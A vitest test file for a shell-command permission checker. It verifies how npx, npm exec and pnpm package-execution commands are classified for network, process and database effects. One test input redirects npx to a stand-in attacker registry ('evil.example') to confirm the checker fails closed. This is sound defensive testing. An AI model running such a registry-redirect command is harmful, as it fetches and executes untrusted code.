import { mkdir, mkdtemp, rm, writeFile } from 'node:fs/promises'
import os from 'node:os'
import path from 'node:path'
import { afterEach, describe, expect, it } from 'vitest'

import { verdict } from '../../core/verdict/verdict.js'
import { verdictTestContext } from '../verdict/helpers.js'

describe('package-exec verdict', () => {
  const tempDirs: string[] = []

  afterEach(async () => {
    await Promise.all(
      tempDirs.splice(0).map((dir) => rm(dir, { recursive: true, force: true }).catch(() => {})),
    )
  })

  it('asks for npx remote package acquisition', async () => {
    const result = await verdict('npx -y prettier --version', verdictTestContext())
    expect(result.permission).toBe('ask')
    expect(result.reason).toBe('external_effect')
    expect(result.effectPlan).toBeDefined()
    expect(result.capabilityRequests?.some((req) => req.action === 'network.connect')).toBe(true)
  })

  it.each(['--version', '--help'])('allows the read-only npx wrapper option %s', async (option) => {
    const result = await verdict(`npx ${option}`, verdictTestContext())

    expect(result.permission).toBe('allow')
    expect(result.effect).toBe('read_only')
    expect(result.capabilityRequests?.some((req) => req.action === 'network.connect')).toBe(false)
    expect(result.capabilityRequests?.some((req) => req.action === 'fs.write')).toBe(false)
  })

  it('allows npx local bin when resolved under repo', async () => {
    const dir = await mkdtemp(path.join(os.tmpdir(), 'belay-npx-local-'))
    tempDirs.push(dir)
    const binDir = path.join(dir, 'node_modules', '.bin')
    await mkdir(binDir, { recursive: true })
    await writeFile(path.join(binDir, 'tsc'), '#!/usr/bin/env node\n')

    const result = await verdict('npx tsc --version', {
      ...verdictTestContext(),
      cwd: dir,
      repoRoot: dir,
    })
    expect(result.permission).toBe('allow')
    expect(result.effectPlan).toBeDefined()
    expect(result.capabilityRequests?.some((req) => req.action === 'network.connect')).toBe(false)
    expect(result.capabilityRequests?.some((req) => req.action === 'process.exec')).toBe(true)
  })

  it('fails closed for unsupported npx options even when a local bin exists', async () => {
    const dir = await mkdtemp(path.join(os.tmpdir(), 'belay-npx-option-'))
    tempDirs.push(dir)
    const binDir = path.join(dir, 'node_modules', '.bin')
    await mkdir(binDir, { recursive: true })
    await writeFile(path.join(binDir, 'tsc'), '#!/usr/bin/env node\n')

    const result = await verdict('npx --registry=https://evil.example tsc --version', {
      ...verdictTestContext(),
      cwd: dir,
      repoRoot: dir,
    })
    expect(result.permission).toBe('ask')
    expect(result.reason).toBe('unknown_local_effect')
    expect(result.capabilityRequests?.some((req) => req.action === 'indeterminate')).toBe(true)
  })

  it('keeps every package-exec segment in a chained effect plan', async () => {
    const dir = await mkdtemp(path.join(os.tmpdir(), 'belay-npx-chain-'))
    tempDirs.push(dir)
    const binDir = path.join(dir, 'node_modules', '.bin')
    await mkdir(binDir, { recursive: true })
    await writeFile(path.join(binDir, 'tsc'), '#!/usr/bin/env node\n')
    await writeFile(path.join(binDir, 'vitest'), '#!/usr/bin/env node\n')

    const result = await verdict('npx tsc --version && npx vitest --version', {
      ...verdictTestContext(),
      cwd: dir,
      repoRoot: dir,
    })
    expect(result.permission).toBe('allow')
    expect(
      result.capabilityRequests?.filter((request) => request.action === 'process.exec'),
    ).toHaveLength(2)
    expect(JSON.stringify(result.effectPlan)).toContain('tsc')
    expect(JSON.stringify(result.effectPlan)).toContain('vitest')
  })

  it('asks for opaque npx call scripts', async () => {
    const result = await verdict('npx -c "console.log(1)"', verdictTestContext())
    expect(result.permission).toBe('ask')
    expect(result.reason).toBe('unknown_local_effect')
    expect(result.effectPlan).toBeDefined()
  })

  it('asks for npm exec remote acquisition by default', async () => {
    const result = await verdict('npm exec vitest --version', verdictTestContext())
    expect(result.permission).toBe('ask')
    expect(result.reason).toBe('external_effect')
  })

  it('forces npm exec acquisition even when a local bin exists', async () => {
    const dir = await mkdtemp(path.join(os.tmpdir(), 'belay-npm-exec-local-'))
    tempDirs.push(dir)
    const binDir = path.join(dir, 'node_modules', '.bin')
    await mkdir(binDir, { recursive: true })
    await writeFile(path.join(binDir, 'vitest'), '#!/usr/bin/env node\n')

    const result = await verdict('npm exec vitest --version', {
      ...verdictTestContext(),
      cwd: dir,
      repoRoot: dir,
    })
    expect(result.permission).toBe('ask')
    expect(result.reason).toBe('external_effect')
    expect(result.capabilityRequests?.some((req) => req.action === 'network.connect')).toBe(true)
  })

  it('asks for pnpm dlx acquisition', async () => {
    const result = await verdict('pnpm dlx cowsay hi', verdictTestContext())
    expect(result.permission).toBe('ask')
    expect(result.reason).toBe('external_effect')
  })

  it.each([
    'pnpm exec',
    'npx',
    'npm exec',
  ])('retains remote database effects through %s package execution', async (launcher) => {
    const dir = await mkdtemp(path.join(os.tmpdir(), 'belay-package-exec-prisma-'))
    tempDirs.push(dir)
    const binDir = path.join(dir, 'node_modules', '.bin')
    await mkdir(binDir, { recursive: true })
    await writeFile(path.join(binDir, 'prisma'), '#!/usr/bin/env node\n')

    const result = await verdict(
      `DATABASE_URL=postgresql://user@db.example.com:5432/app ${launcher} prisma migrate deploy`,
      { ...verdictTestContext(), cwd: dir, repoRoot: dir },
    )

    expect(result.permission).toBe('ask')
    expect(
      result.capabilityRequests?.some(
        (request) =>
          request.action === 'network.connect' &&
          request.resource.kind === 'network' &&
          request.resource.host === 'db.example.com' &&
          request.resource.mode === 'mutate',
      ),
    ).toBe(true)
  })

  it('keeps unknown prisma endpoints partial through local package execution', async () => {
    const dir = await mkdtemp(path.join(os.tmpdir(), 'belay-package-exec-prisma-unknown-'))
    tempDirs.push(dir)
    const binDir = path.join(dir, 'node_modules', '.bin')
    await mkdir(binDir, { recursive: true })
    await writeFile(path.join(binDir, 'prisma'), '#!/usr/bin/env node\n')

    const result = await verdict('pnpm exec prisma migrate deploy', {
      ...verdictTestContext(),
      cwd: dir,
      repoRoot: dir,
    })

    expect(result.permission).toBe('ask')
    expect(result.effectPlan?.completeness).toBe('partial')
    expect(result.capabilityRequests?.some((request) => request.action === 'indeterminate')).toBe(
      true,
    )
  })
})
